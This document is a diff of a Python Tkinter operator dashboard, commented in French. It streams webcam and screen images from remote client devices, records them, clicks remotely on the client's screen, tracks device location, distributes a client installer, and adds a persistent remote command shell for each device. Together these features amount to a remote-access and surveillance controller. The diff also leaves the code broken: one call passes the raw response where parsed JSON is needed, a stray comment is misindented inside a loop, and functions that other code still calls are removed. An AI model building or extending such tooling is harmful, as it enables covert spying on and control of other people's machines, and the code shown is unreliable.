@@ -5,8 +5,7 @@ Cette GUI ne parle jamais directement aux clients : elle passe toujours
 par l'API du serveur. Les flux caméra et écran s'affichent EN PERMANENCE
 côte à côte, chacun avec ses propres contrôles (démarrer/arrêter/
 enregistrer) : ce sont deux panneaux totalement indépendants l'un de
-l'autre, y compris pour l'enregistrement (on peut enregistrer l'un sans
-toucher à l'autre).
+l'autre, y compris pour l'enregistrement.
 
 Contrôle souris : quand le flux écran est actif, le client remonte la
 position de sa souris (affichée par un curseur rouge sur l'image) et un
@@ -18,6 +17,15 @@ Enregistrement : un thread dédié par flux (VideoRecorder) écrit les images
 tant qu'aucune nouvelle n'arrive), toutes à la même taille, puis le
 fichier est relu et vérifié à l'arrêt pour signaler un problème (vidéo
 vide, écran noir...).
+
+CMD Commandes : une fenêtre GUI par appareil (une par device_id), liée à
+la console persistante du client. Fermer la fenêtre GUI NE ferme PAS la
+console distante — elle continue de tourner côté client. Rouvrir la
+fenêtre réaffiche le buffer courant.
+
+Chat : une fenêtre GUI par appareil, miroir de la conversation avec la
+console visible du client. Seul l'opérateur peut ouvrir/fermer la console
+distante via les boutons dédiés.
 """
 
 import argparse
@@ -40,9 +48,6 @@ import requests
 from PIL import Image, ImageDraw, ImageFilter, ImageTk
 
 try:
-    # Carte OpenStreetMap intégrée (pip install tkintermapview). Optionnelle :
-    # si absente, le panneau de localisation reste fonctionnel (boutons +
-    # coordonnées en texte), seule la carte visuelle est remplacée par un message.
     from tkintermapview import TkinterMapView
     _HAS_MAP = True
 except ImportError:
@@ -53,46 +58,40 @@ DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
 POLL_DEVICES_INTERVAL = 2.0
 POLL_STATUS_INTERVAL = 1.0
 POLL_LOCATION_INTERVAL = 2.0
-POLL_MOUSE_INTERVAL = 0.1     # ~10 Hz, aligné sur la cadence d'envoi du client
-DEFAULT_MAP_LAT = -18.8792    # Antananarivo : position affichée tant qu'aucune position n'est reçue
+POLL_MOUSE_INTERVAL = 0.1
+DEFAULT_MAP_LAT = -18.8792
 DEFAULT_MAP_LON = 47.5079
-# tkintermapview pointe par défaut sur les serveurs de tuiles d'OpenStreetMap, qui bloquent
-# désormais les requêtes ne respectant pas leur politique d'usage (pas de user-agent dédié).
-# CARTO (basemaps.cartocdn.com) a ensuite été essayé, mais exige maintenant une clé API.
-# On utilise donc Esri, gratuit et sans clé pour ce type d'usage, en style sombre pour rester
-# cohérent avec le thème. Attention : Esri inverse x et y dans son schéma d'URL (contrairement
-# à OSM/CARTO/Google) — d'où {z}/{y}/{x} et non {z}/{x}/{y}. Couverture : zoom 0 à 16 seulement.
-# Attribution requise : Esri, HERE, Garmin, © contributeurs OpenStreetMap.
 MAP_TILE_SERVER = "https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}"
 MAP_TILE_MAX_ZOOM = 16
-POLL_FRAME_INTERVAL = 0.03   # pause après une réponse vide (204) : 0.1 ajoutait jusqu'à 100 ms de latence
-# Attente côté serveur d'une nouvelle image (long-polling). 0 = désactivé : OBLIGATOIRE sur
-# PythonAnywhere, dont le nombre de workers est très limité (une requête qui attend bloquerait
-# les envois du client). Avec un VPS / gunicorn --threads 8, mettre 2.0 réduit encore la latence.
+POLL_FRAME_INTERVAL = 0.03
 FRAME_LONG_POLL_SECONDS = 0.0
 REQUEST_TIMEOUT = 5
 DOWNLOAD_TIMEOUT = 30
 RECORD_FPS_CAMERA = 10
-RECORD_FPS_SCREEN = 5        # l'écran arrive bien plus lentement que la caméra
-MAX_RECORD_WIDTH = 1920      # on réduit les écrans plus larges (CPU + taille du fichier)
-STALL_WARN_SECONDS = 10.0    # aucune nouvelle image reçue depuis ce délai -> avertissement
-BLACK_FRAME_STD = 2.0        # écart-type en dessous duquel une image est considérée noire/uniforme
+RECORD_FPS_SCREEN = 5
+MAX_RECORD_WIDTH = 1920
+STALL_WARN_SECONDS = 10.0
+BLACK_FRAME_STD = 2.0
 LOG_THROTTLE_SECONDS = 5.0
 MOUSE_CURSOR_COLOR = "#ff3b30"
 MOUSE_CURSOR_RADIUS = 6
 
-# --- Thème « Midnight » : fond bleu nuit, cartes sombres, accents néon doux ---
-COLOR_BG = "#0b1020"        # fond de la fenêtre
-COLOR_CARD = "#141b30"      # cartes (panneaux, journal)
-COLOR_CARD_HI = "#1b2440"   # survol / éléments surélevés
+# Shell / chat
+SHELL_OUTPUT_POLL_INTERVAL_MS = 300
+SHELL_CHAT_POLL_INTERVAL_MS = 800
+
+# --- Thème « Midnight » ---
+COLOR_BG = "#0b1020"
+COLOR_CARD = "#141b30"
+COLOR_CARD_HI = "#1b2440"
 COLOR_BORDER = "#263150"
 COLOR_VIDEO_BG = "#070a14"
 COLOR_TEXT = "#e8ecf8"
 COLOR_MUTED = "#8b95b5"
-COLOR_ACCENT = "#4f8cff"    # bleu principal
+COLOR_ACCENT = "#4f8cff"
 COLOR_ACCENT_HI = "#6aa0ff"
-COLOR_CAMERA = "#22d3ee"    # cyan : identité visuelle du flux caméra
-COLOR_SCREEN = "#a78bfa"    # violet : identité visuelle du flux écran
+COLOR_CAMERA = "#22d3ee"
+COLOR_SCREEN = "#a78bfa"
 COLOR_OK = "#22c55e"
 COLOR_OK_HI = "#34d874"
 COLOR_KO = "#ef4444"
@@ -107,16 +106,12 @@ FONT_MONO = "Consolas" if platform.system() == "Windows" else "DejaVu Sans Mono"
 BANNER_HEIGHT = 96
 STREAM_ACCENTS = {"camera": COLOR_CAMERA, "screen": COLOR_SCREEN}
 
-# Codecs essayés dans l'ordre, selon l'extension choisie par l'utilisateur.
-# cv2.VideoWriter ne lève AUCUNE exception si un codec est indisponible :
-# il faut vérifier isOpened() soi-même, sinon l'enregistrement échoue en
-# silence (fichier vide ou absent, sans aucun message).
 FOURCC_CANDIDATES_MP4 = ["mp4v", "avc1", "X264"]
 FOURCC_CANDIDATES_AVI = ["XVID", "MJPG"]
 
 
 # ---------------------------------------------------------------------
-# Configuration persistée (adaptée à l'OS)
+# Configuration persistée
 # ---------------------------------------------------------------------
 
 def _config_dir() -> Path:
@@ -154,7 +149,7 @@ def resolve_server_url(cli_value: str | None) -> str:
 
 
 # ---------------------------------------------------------------------
-# Images générées par le code (aucun fichier à fournir)
+# Images générées par le code
 # ---------------------------------------------------------------------
 
 def _hex_to_rgb(color: str) -> tuple[int, int, int]:
@@ -163,8 +158,6 @@ def _hex_to_rgb(color: str) -> tuple[int, int, int]:
 
 
 def _custom_banner_path() -> Path | None:
-    """Si vous déposez une image « banner.png » (ou .jpg) à côté de ce script
-    — ou dans le dossier de configuration — elle remplace le dégradé du bandeau."""
     for folder in (Path(__file__).resolve().parent, CONFIG_DIR):
         for name in ("banner.png", "banner.jpg", "banner.jpeg"):
             candidate = folder / name
@@ -174,8 +167,6 @@ def _custom_banner_path() -> Path | None:
 
 
 def make_banner(width: int, height: int) -> Image.Image:
-    """Bandeau d'en-tête : photo personnalisée assombrie, ou dégradé bleu nuit -> indigo
-    avec des halos lumineux décoratifs."""
     width = max(width, 200)
     custom = _custom_banner_path()
     if custom is not None:
@@ -186,9 +177,9 @@ def make_banner(width: int, height: int) -> Image.Image:
             left, top = (photo.width - width) // 2, (photo.height - height) // 2
             photo = photo.crop((left, top, left + width, top + height))
             veil = Image.new("RGB", (width, height), _hex_to_rgb(COLOR_BG))
-            return Image.blend(photo, veil, 0.62)   # voile sombre : le texte reste lisible
+            return Image.blend(photo, veil, 0.62)
         except Exception:
-            pass   # image illisible : on retombe sur le dégradé
+            pass
 
     x = np.linspace(0.0, 1.0, width)[None, :, None]
     y = np.linspace(0.0, 1.0, height)[:, None, None]
@@ -207,16 +198,15 @@ def make_banner(width: int, height: int) -> Image.Image:
         (width - 420, height // 2, 60, (255, 255, 255, 14)),
     ):
         draw.ellipse((cx - radius, cy - radius, cx + radius, cy + radius), fill=color)
-    glow = glow.filter(ImageFilter.GaussianBlur(28))   # halos doux, sans bords durs
+    glow = glow.filter(ImageFilter.GaussianBlur(28))
     image = Image.alpha_composite(image, glow)
 
-    line = ImageDraw.Draw(image)   # fine ligne lumineuse en bas du bandeau
+    line = ImageDraw.Draw(image)
     line.rectangle((0, height - 2, width, height), fill=(*_hex_to_rgb(COLOR_ACCENT), 120))
     return image.convert("RGB")
 
 
 def make_logo(size: int = 56) -> Image.Image:
-    """Logo : carré arrondi dégradé avec un objectif stylisé."""
     s = size * 4
     gradient = np.linspace(0.0, 1.0, s)[None, :, None] * 0.5 + np.linspace(0.0, 1.0, s)[:, None, None] * 0.5
     c1 = np.array(_hex_to_rgb(COLOR_ACCENT), dtype=np.float32)
@@ -233,7 +223,6 @@ def make_logo(size: int = 56) -> Image.Image:
 
 
 def make_placeholder(kind: str, color_hex: str, size: int = 150) -> Image.Image:
-    """Pictogramme affiché dans un panneau vidéo tant qu'aucune image n'arrive."""
     s = size * 3
     image = Image.new("RGBA", (s, s), (0, 0, 0, 0))
     d = ImageDraw.Draw(image)
@@ -254,11 +243,6 @@ def make_placeholder(kind: str, color_hex: str, size: int = 150) -> Image.Image:
 
 
 def _open_video_writer(path: str, width: int, height: int, fps: float):
-    """Essaie plusieurs codecs jusqu'à en trouver un qui s'ouvre réellement.
-    Retourne (writer, nom_du_codec, chemin_final) ou (None, None, path).
-
-    Si aucun codec ne convient pour l'extension demandée, bascule sur l'autre
-    famille (.mp4 -> .avi MJPG) plutôt que de produire un fichier inutilisable."""
     extension = Path(path).suffix.lower()
     attempts = [(path, FOURCC_CANDIDATES_AVI if extension == ".avi" else FOURCC_CANDIDATES_MP4)]
     if extension != ".avi":
@@ -286,15 +270,7 @@ class RecordingReport:
 
 
 class VideoRecorder:
-    """Écrit dans un fichier vidéo la DERNIÈRE image reçue, à cadence fixe.
-
-    Pourquoi : le serveur ne garde que la dernière image de chaque flux et la
-    GUI la récupère par polling. Écrire une image à chaque réponse HTTP donne
-    une vidéo dont la vitesse dépend du réseau (accélérée ou saccadée), et un
-    VideoWriter OpenCV abandonne EN SILENCE toute image dont la taille diffère
-    de celle de la première (fichier .mp4 présent mais vide/illisible).
-    Ici : taille figée à la première image (paire, limitée en largeur), chaque
-    image est ramenée à cette taille, et l'écriture suit l'horloge réelle."""
+    """Écrit dans un fichier vidéo la DERNIÈRE image reçue, à cadence fixe."""
 
     def __init__(self, path: str, fps: float, log=print, on_fatal=None):
         self.path = path
@@ -306,7 +282,7 @@ class VideoRecorder:
         self._thread: threading.Thread | None = None
         self._latest: np.ndarray | None = None
         self._last_push = 0.0
-        self._size: tuple[int, int] | None = None   # (largeur, hauteur) figée
+        self._size: tuple[int, int] | None = None
         self._writer: cv2.VideoWriter | None = None
         self._codec: str | None = None
         self._started_at: float | None = None
@@ -315,9 +291,8 @@ class VideoRecorder:
         self.max_std = 0.0
         self.failed = False
 
-    # -- API appelée depuis le thread réseau -------------------------------
     def push(self, image: np.ndarray) -> None:
-        std = float(image[::8, ::8].std())  # échantillonné : très peu coûteux
+        std = float(image[::8, ::8].std())
         with self._lock:
             self._latest = image
             self._last_push = time.monotonic()
@@ -343,13 +318,12 @@ class VideoRecorder:
             duration, self.max_std, verified_frames, verified_ok,
         )
 
-    # -- interne ------------------------------------------------------------
     def _fit_size(self, image: np.ndarray) -> tuple[int, int]:
         height, width = image.shape[:2]
         if width > MAX_RECORD_WIDTH:
             height = int(height * MAX_RECORD_WIDTH / width)
             width = MAX_RECORD_WIDTH
-        return max(2, width - width % 2), max(2, height - height % 2)  # dimensions paires
+        return max(2, width - width % 2), max(2, height - height % 2)
 
     def _normalize(self, image: np.ndarray) -> np.ndarray:
         width, height = self._size
@@ -383,7 +357,7 @@ class VideoRecorder:
                         "est répétée dans la vidéo (flux arrêté ou client déconnecté ?)."
                     )
             next_tick += interval
-            if now - next_tick > 1.0:   # après un blocage, on ne rattrape pas en rafale
+            if now - next_tick > 1.0:
                 next_tick = now + interval
 
     def _open_writer(self, first_frame: np.ndarray) -> bool:
@@ -406,7 +380,6 @@ class VideoRecorder:
         return True
 
     def _verify(self) -> tuple[int, bool]:
-        """Relit le fichier produit : c'est la seule façon de savoir s'il est exploitable."""
         if self.frames_written == 0 or not Path(self.path).exists():
             return 0, False
         capture = cv2.VideoCapture(self.path)
@@ -421,34 +394,28 @@ class VideoRecorder:
 
 
 class StreamPanel:
-    """Regroupe tout ce qui concerne UN flux (caméra ou écran) : ses widgets
-    et son état d'enregistrement. Les deux flux sont totalement indépendants
-    l'un de l'autre — démarrer, arrêter ou enregistrer l'un n'affecte jamais
-    l'autre, et les deux s'affichent en permanence côte à côte."""
+    """Regroupe tout ce qui concerne UN flux (caméra ou écran)."""
 
     def __init__(self, key: str, title: str):
-        self.key = key              # "camera" ou "screen"
-        self.title = title          # libellé affiché, ex. "📷 Caméra"
-        self.on = False             # ce flux tourne-t-il sur l'appareil sélectionné ?
+        self.key = key
+        self.title = title
+        self.on = False
         self.recording = False
         self.recorder: VideoRecorder | None = None
         self.last_jpeg: bytes | None = None
-        # Affichage : taille disponible (mise à jour par le thread Tk) et
-        # « boîte aux lettres » à une seule image, pour ne jamais accumuler de retard.
         self.view_size: tuple[int, int] = (420, 380)
         self.pending_image = None
         self.display_scheduled = False
         self.display_lock = threading.Lock()
-        # Widgets (créés dans _build_stream_panel) :
         self.video_label: tk.Label | None = None
         self.title_var: tk.StringVar | None = None
         self.status_var: tk.StringVar | None = None
         self.btn_start: ttk.Button | None = None
         self.btn_stop: ttk.Button | None = None
         self.btn_record: ttk.Button | None = None
-        self.rec_badge: tk.Label | None = None   # badge "● REC" (couleur, pas une émoji : plus fiable)
+        self.rec_badge: tk.Label | None = None
         self.status_label: tk.Label | None = None
-        self.placeholder = None                  # ImageTk.PhotoImage du pictogramme d'attente
+        self.placeholder = None
 
 
 class CameraServerApp:
@@ -456,7 +423,6 @@ class CameraServerApp:
         self.root = root
         self.server_url = server_url.rstrip("/")
         self.root.title("Contrôle caméra / écran — Dashboard")
-        # Taille adaptée à l'écran : la fenêtre ne dépasse jamais la zone visible
         screen_w, screen_h = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
         win_w, win_h = min(1440, screen_w - 60), min(860, screen_h - 90)
         self.root.geometry(f"{win_w}x{win_h}+{max((screen_w - win_w) // 2, 0)}+{max((screen_h - win_h) // 3, 0)}")
@@ -470,19 +436,20 @@ class CameraServerApp:
         self.log_queue: "queue.Queue" = queue.Queue()
         self._throttle_times: dict[str, float] = {}
 
-        # Localisation : état du navigateur ouvert chez le client sélectionné.
         self.location_open = False
         self.last_location: dict | None = None
         self._location_marker = None
 
-        # Souris : position de l'appareil sélectionné (pour l'overlay) et
-        # taille de l'écran source (pour convertir un clic image -> écran).
         self.mouse_position: dict | None = None
 
         self.panels: dict[str, StreamPanel] = {
             "camera": StreamPanel("camera", "📷  Caméra"),
             "screen": StreamPanel("screen", "🖥  Écran"),
         }
+
+        # Fenêtres CMD/Chat, une par device_id
+        self._cmd_windows: dict[str, tk.Toplevel] = {}
+        self._chat_windows: dict[str, tk.Toplevel] = {}
 
         self._build_ui()
         self._poll_logs()
@@ -492,8 +459,6 @@ class CameraServerApp:
         threading.Thread(target=self._poll_status_loop, daemon=True).start()
         threading.Thread(target=self._poll_location_loop, daemon=True).start()
         threading.Thread(target=self._poll_mouse_loop, daemon=True).start()
-        # Un thread de polling PAR flux : un flux lent à répondre ne doit
-        # jamais retarder l'affichage (ni l'enregistrement) de l'autre.
         for key in self.panels:
             threading.Thread(target=self._poll_frame_loop, args=(key,), daemon=True).start()
 
@@ -503,19 +468,6 @@ class CameraServerApp:
     # Construction de l'interface
     # ------------------------------------------------------------------
     def _build_ui(self) -> None:
-        """Mise en page « tableau de bord » : TOUT est visible sans défiler.
-
-        +--------------------------------------------------------------+
-        |  En-tête compact : logo · titre · statut · téléchargement    |
-        |  Barre d'outils : appareil · serveur                          |
-        +-----------------------------------------+--------------------+
-        |   Caméra        |        Écran          |   📍 Localisation  |
-        |   (vidéo + contrôles)  (vidéo + contrôles)|   (carte pleine    |
-        +-----------------------------------------+    hauteur)         |
-        |   Journal des événements (redimensionnable)|                  |
-        +-----------------------------------------+--------------------+
-        Les séparateurs (sashes) se glissent à la souris pour ajuster chaque zone.
-        """
         self._apply_theme()
 
         self._logo_photo = ImageTk.PhotoImage(make_logo(34))
@@ -524,7 +476,7 @@ class CameraServerApp:
         except tk.TclError:
             pass
 
-        # ---- En-tête compact ----
+        # ---- En-tête ----
         header = tk.Frame(self.root, bg=COLOR_CARD)
         header.pack(fill="x")
         tk.Frame(header, bg=COLOR_ACCENT, height=2).pack(fill="x")
@@ -541,7 +493,6 @@ class CameraServerApp:
             bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 8),
         ).pack(anchor="w")
 
-        # Packés côté droit : ils gardent toujours leur place quand la fenêtre rétrécit
         self.btn_download = ttk.Button(
             header_in, text="⬇  Télécharger le client (.exe)", command=self.download_client_installer,
             style="Primary.TButton", cursor="hand2",
@@ -557,7 +508,7 @@ class CameraServerApp:
         self.status_label.pack()
         tk.Frame(header, bg=COLOR_BORDER, height=1).pack(fill="x")
 
-        # ---- Barre d'outils : sélecteur d'appareil + adresse du serveur ----
+        # ---- Barre d'outils : sélecteur d'appareil ----
         toolbar = tk.Frame(self.root, bg=COLOR_BG)
         toolbar.pack(fill="x", padx=14, pady=(10, 8))
         tk.Label(
@@ -574,7 +525,24 @@ class CameraServerApp:
         self.device_combo.pack(side="left", fill="x", expand=True, ipady=2)
         self.device_combo.bind("<<ComboboxSelected>>", self._on_device_selected)
 
-        # ---- Zone principale : [ flux + journal ] | [ localisation ] ----
+        # ---- Barre shell/chat ----
+        shell_toolbar = tk.Frame(self.root, bg=COLOR_BG)
+        shell_toolbar.pack(fill="x", padx=14, pady=(0, 8))
+        tk.Label(
+            shell_toolbar, text="OUTILS DISTANTS", bg=COLOR_BG, fg=COLOR_MUTED, font=(FONT, 9, "bold")
+        ).pack(side="left", padx=(0, 10))
+        self.btn_open_cmd = ttk.Button(
+            shell_toolbar, text="⌨  CMD distant", style="Primary.TButton", cursor="hand2",
+            command=self._open_cmd_window_for_selected,
+        )
+        self.btn_open_cmd.pack(side="left", padx=(0, 8))
+        self.btn_open_chat = ttk.Button(
+            shell_toolbar, text="💬  Chat distant", style="Primary.TButton", cursor="hand2",
+            command=self._open_chat_window_for_selected,
+        )
+        self.btn_open_chat.pack(side="left")
+
+        # ---- Zone principale ----
         sash = dict(bg=COLOR_BG, sashwidth=8, sashrelief="flat", borderwidth=0, sashpad=0, opaqueresize=True)
         main = tk.PanedWindow(self.root, orient="horizontal", **sash)
         main.pack(fill="both", expand=True, padx=14, pady=(0, 14))
@@ -582,7 +550,6 @@ class CameraServerApp:
         left = tk.PanedWindow(main, orient="vertical", **sash)
         main.add(left, minsize=620, stretch="always")
 
-        # Les deux flux, côte à côte, en haut à gauche
         streams_frame = tk.Frame(left, bg=COLOR_BG)
         streams_frame.columnconfigure(0, weight=1, uniform="panel")
         streams_frame.columnconfigure(1, weight=1, uniform="panel")
@@ -591,11 +558,9 @@ class CameraServerApp:
         self._build_stream_panel(streams_frame, self.panels["screen"], column=1)
         left.add(streams_frame, minsize=280, stretch="always")
 
-        # Journal : toujours visible sous les flux, hauteur réglable à la souris
         log_card = self._build_log_panel(left)
         left.add(log_card, minsize=90, height=170, stretch="never")
 
-        # Localisation : colonne de droite, la carte occupe toute la hauteur
         location_card = self._build_location_panel(main)
         main.add(location_card, minsize=300, width=420, stretch="never")
 
@@ -634,7 +599,6 @@ class CameraServerApp:
         self.log_text["state"] = "disabled"
 
     def _apply_theme(self) -> None:
-        """Déclare tous les styles ttk (thème « clam » repeint aux couleurs de l'application)."""
         style = ttk.Style()
         style.theme_use("clam")
 
@@ -679,7 +643,6 @@ class CameraServerApp:
         )
         style.map("Dark.Vertical.TScrollbar", background=[("active", COLOR_BORDER)])
 
-        # Liste déroulante du Combobox (widget Tk classique, hors ttk)
         self.root.option_add("*TCombobox*Listbox.background", COLOR_CARD)
         self.root.option_add("*TCombobox*Listbox.foreground", COLOR_TEXT)
         self.root.option_add("*TCombobox*Listbox.selectBackground", COLOR_ACCENT)
@@ -687,14 +650,12 @@ class CameraServerApp:
         self.root.option_add("*TCombobox*Listbox.font", (FONT, 10))
 
     def _build_stream_panel(self, parent: tk.Frame, panel: StreamPanel, column: int) -> None:
-        """Construit un panneau complet (vidéo + ses propres boutons) pour un flux."""
         accent = STREAM_ACCENTS.get(panel.key, COLOR_ACCENT)
         outer = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1, highlightbackground=COLOR_BORDER)
         outer.grid(row=0, column=column, sticky="nsew", padx=(0 if column == 0 else 5, 5 if column == 0 else 0))
         outer.columnconfigure(0, weight=1)
         outer.rowconfigure(2, weight=1)
 
-        # Liseré de couleur en haut de la carte : identifie le flux d'un coup d'œil
         tk.Frame(outer, bg=accent, height=3).grid(row=0, column=0, sticky="ew")
 
         title_bar = tk.Frame(outer, bg=COLOR_CARD)
@@ -706,15 +667,12 @@ class CameraServerApp:
         panel.rec_badge = tk.Label(
             title_bar, text="● REC", bg=COLOR_REC, fg="white", font=(FONT, 9, "bold"), padx=8, pady=1,
         )
-        # Pas de .pack() ici : le badge n'apparaît que pendant l'enregistrement (voir _start/_stop_recording)
         panel.status_var = tk.StringVar(value="● Arrêté")
         panel.status_label = tk.Label(
             title_bar, textvariable=panel.status_var, bg=COLOR_CARD, fg=COLOR_KO, font=(FONT, 9, "bold"),
         )
         panel.status_label.pack(side="right")
 
-        # Le « support » a une taille FIXE minimale et ne grandit jamais selon l'image :
-        # la vidéo s'adapte à l'espace disponible au lieu de pousser les boutons hors de la fenêtre.
         panel.placeholder = ImageTk.PhotoImage(make_placeholder(panel.key, accent, 96))
         holder = tk.Frame(outer, bg=COLOR_VIDEO_BG, width=240, height=140)
         holder.pack_propagate(False)
@@ -728,8 +686,6 @@ class CameraServerApp:
             "<Configure>",
             lambda event, p=panel: setattr(p, "view_size", (max(event.width, 1), max(event.height, 1))),
         )
-        # Panneau écran : clic sur l'image = clic à distance (coordonnées
-        # écran réelles, converties via la taille d'écran rapportée par le client).
         if panel.key == "screen":
             panel.video_label.configure(cursor="crosshair")
             panel.video_label.bind("<Button-1>", lambda event, p=panel: self._on_screen_click(p, event))
@@ -761,13 +717,9 @@ class CameraServerApp:
         panel.video_label.image = panel.placeholder
 
     def _build_location_panel(self, parent: tk.Misc) -> tk.Frame:
-        """Panneau « Localisation » (colonne de droite) : commandes pour
-        ouvrir/fermer le navigateur chez le client sélectionné, carte
-        (tkintermapview / OpenStreetMap) qui occupe toute la hauteur
-        disponible, et dernières coordonnées reçues sous la carte."""
         outer = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1, highlightbackground=COLOR_BORDER)
         outer.columnconfigure(0, weight=1)
-        outer.rowconfigure(3, weight=1)       # la carte absorbe tout l'espace vertical
+        outer.rowconfigure(3, weight=1)
 
         tk.Frame(outer, bg=COLOR_WARN, height=3).grid(row=0, column=0, sticky="ew")
 
@@ -831,8 +783,6 @@ class CameraServerApp:
         return outer
 
     def _send_location_command(self, command: str) -> None:
-        """Envoie OPEN ou CLOSE : la GUI ne parle jamais directement au
-        client, toujours via l'API du serveur (comme pour START/STOP)."""
         if self.selected_device_id is None:
             self._log("Aucun appareil sélectionné")
             return
@@ -847,7 +797,7 @@ class CameraServerApp:
             self._log(f"Échec de l'envoi de la commande de localisation : {exc}")
 
     # ------------------------------------------------------------------
-    # Boucles réseau (threads d'arrière-plan)
+    # Boucles réseau
     # ------------------------------------------------------------------
     def _poll_devices_loop(self) -> None:
         while True:
@@ -907,15 +857,16 @@ class CameraServerApp:
                     timeout=REQUEST_TIMEOUT,
                 )
                 if response.status_code == 200:
-                    self._update_location_display(response.json())
+                    self._update_location_display(response)
             except requests.RequestException:
                 pass
             time.sleep(POLL_LOCATION_INTERVAL)
 
+            # Partie deux ###############
+
+        # ------------------------------------------------------------------
     def _poll_mouse_loop(self) -> None:
-        """Récupère la position souris de l'appareil sélectionné. La GUI
-        l'utilise pour dessiner un curseur sur l'image écran et convertir un
-        clic sur l'image réduite en coordonnées écran réelles."""
+        """Interroge /api/mouse/latest pour dessiner le curseur sur l'image écran."""
         while True:
             device_id = self.selected_device_id
             if device_id is None:
@@ -924,7 +875,8 @@ class CameraServerApp:
             try:
                 response = requests.get(
                     f"{self.server_url}/api/mouse/latest",
-                    params={"device_id": device_id}, timeout=REQUEST_TIMEOUT,
+                    params={"device_id": device_id},
+                    timeout=REQUEST_TIMEOUT,
                 )
                 if response.status_code == 200:
                     self.mouse_position = response.json()
@@ -932,142 +884,221 @@ class CameraServerApp:
                 pass
             time.sleep(POLL_MOUSE_INTERVAL)
 
-    def _poll_frame_loop(self, stream_key: str) -> None:
-        """Boucle dédiée à UN SEUL flux (caméra ou écran) : les deux tournent
-        en parallèle, donc un flux lent à répondre n'affecte jamais l'autre.
-
-        Long-polling : on indique au serveur le numéro de la dernière image
-        reçue (« after ») ; il ne répond que lorsqu'une image PLUS RÉCENTE
-        existe, et immédiatement à son arrivée. Résultat : pas d'attente
-        artificielle, et plus aucune image téléchargée deux fois."""
-        panel = self.panels[stream_key]
-        session = requests.Session()   # connexion persistante (keep-alive)
-        last_device = None
-        last_seq = None
+    def _poll_frame_loop(self, key: str) -> None:
+        """Un thread de polling par flux : récupère les images en long-polling
+        et les transmet au thread Tk pour affichage (Tk n'est pas thread-safe)."""
+        panel = self.panels[key]
+        last_seq = -1
         while True:
             device_id = self.selected_device_id
             if device_id is None:
-                time.sleep(POLL_FRAME_INTERVAL)
+                time.sleep(0.2)
                 continue
-            if device_id != last_device:
-                last_device = device_id
-                last_seq = None
-
-            started = time.monotonic()
-            long_poll_ok = False
             try:
-                params = {"device_id": device_id, "stream": stream_key, "wait": FRAME_LONG_POLL_SECONDS}
-                if last_seq is not None:
-                    params["after"] = last_seq
-                response = session.get(
+                response = requests.get(
                     f"{self.server_url}/api/frame/latest",
-                    params=params,
-                    timeout=REQUEST_TIMEOUT + FRAME_LONG_POLL_SECONDS,
+                    params={
+                        "device_id": device_id,
+                        "stream": key,
+                        "after": last_seq if last_seq >= 0 else "",
+                        "wait": FRAME_LONG_POLL_SECONDS,
+                    },
+                    timeout=REQUEST_TIMEOUT + 1,
                 )
                 if response.status_code == 200 and response.content:
                     seq_header = response.headers.get("X-Frame-Seq")
                     if seq_header is not None:
-                        last_seq = int(seq_header)
-                        long_poll_ok = True   # serveur à jour : pas de pause, on redemande tout de suite
-                    self._handle_frame(panel, response.content)
-                elif response.status_code == 204:
-                    if panel.recording:
-                        self._log_throttled(
-                            f"waiting_frames_{stream_key}",
-                            f"⏳ En attente d'images du flux « {panel.title} » pour l'enregistrement — "
-                            "vérifiez qu'il est bien démarré sur l'appareil sélectionné (bouton Démarrer).",
-                        )
+                        try:
+                            last_seq = int(seq_header)
+                        except ValueError:
+                            pass
+                    jpeg = response.content
+                    panel.last_jpeg = jpeg
+                    # Décodage hors thread Tk (CPU) puis envoi au thread Tk
+                    array = np.frombuffer(jpeg, dtype=np.uint8)
+                    image = cv2.imdecode(array, cv2.IMREAD_COLOR)
+                    if image is not None:
+                        if panel.recorder is not None and panel.recording:
+                            panel.recorder.push(image)
+                        self._queue_display(panel, image)
                 else:
-                    self._log_throttled(
-                        f"bad_status_{stream_key}",
-                        f"Réponse inattendue du serveur pour « {panel.title} » ({response.status_code})",
-                    )
-            except requests.RequestException as exc:
-                self._log_throttled(f"unreachable_{stream_key}", f"Flux « {panel.title} » injoignable : {exc}")
-            except Exception as exc:
-                # Ne JAMAIS laisser une erreur inattendue (décodage, écriture
-                # vidéo...) arrêter cette boucle en silence.
-                self._log_throttled(f"unexpected_{stream_key}", f"Erreur inattendue sur « {panel.title} » : {exc}")
+                    time.sleep(POLL_FRAME_INTERVAL)
+            except requests.RequestException:
+                time.sleep(0.2)
 
-            if not long_poll_ok:
-                # Erreur, 204 immédiat ou ancien serveur sans long-polling : on évite de tourner à vide.
-                elapsed = time.monotonic() - started
-                if elapsed < POLL_FRAME_INTERVAL:
-                    time.sleep(POLL_FRAME_INTERVAL - elapsed)
+    def _queue_display(self, panel: StreamPanel, image: np.ndarray) -> None:
+        """Envoie l'image au thread Tk via after(). Une seule image en attente :
+        si une nouvelle arrive avant l'affichage, elle remplace la précédente
+        (pas de file qui prendrait du retard)."""
+        with panel.display_lock:
+            panel.pending_image = image
+            if panel.display_scheduled:
+                return
+            panel.display_scheduled = True
+        try:
+            self.root.after(0, self._flush_display, panel)
+        except (RuntimeError, tk.TclError):
+            with panel.display_lock:
+                panel.display_scheduled = False
 
-    def _log_throttled(self, key: str, message: str, interval: float = LOG_THROTTLE_SECONDS) -> None:
-        """Comme _log, mais n'écrit le MÊME message (identifié par key) qu'une
-        fois toutes les `interval` secondes, pour éviter de noyer le journal
-        quand un problème persiste pendant plusieurs secondes d'affilée."""
-        now = time.time()
-        last = self._throttle_times.get(key, 0.0)
-        if now - last >= interval:
-            self._throttle_times[key] = now
-            self._log(message)
-
-    # ------------------------------------------------------------------
-    # Sélection de l'appareil
-    # ------------------------------------------------------------------
-    def _sync_device_list(self, devices: dict[str, dict]) -> None:
-        def apply():
-            self.devices = devices
-            labels = [
-                f"{d['name']} — {'connecté' if d['connected'] else 'hors ligne'} ({device_id[:8]})"
-                for device_id, d in devices.items()
-            ]
-            self.device_combo["values"] = labels
-
-            if self.selected_device_id is None and devices:
-                self._select_device(next(iter(devices)))
-            elif self.selected_device_id not in devices and devices:
-                self._select_device(next(iter(devices)))
-            elif not devices:
-                self.selected_device_id = None
-                self.device_var.set("")
-                self.status_var.set("● Aucun appareil connu")
-                self.status_label.configure(foreground=COLOR_KO)
-
